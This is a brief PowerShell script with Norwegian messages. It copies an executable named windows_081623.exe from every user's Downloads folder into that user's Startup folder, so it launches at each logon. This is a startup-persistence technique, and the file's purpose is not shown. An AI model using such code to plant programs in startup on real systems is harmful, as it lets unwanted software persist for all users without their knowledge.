$users = Get-ChildItem -Path "C:\Users" -Directory

foreach ($user in $users) {
    $sourcePath = Join-Path -Path $user.FullName -ChildPath "Downloads\windows_081623.exe"
    $destinationPath = Join-Path -Path $user.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows_081623.exe"
    
    if (Test-Path $sourcePath) {
        # Kopier filen
        Copy-Item -Path $sourcePath -Destination $destinationPath -Force
        Write-Host "Filen ble kopiert til oppstartsmappen for bruker: $($user.Name)"
    } else {
        Write-Host "Kunne ikke finne kildefilen for bruker: $($user.Name)"
    }
}
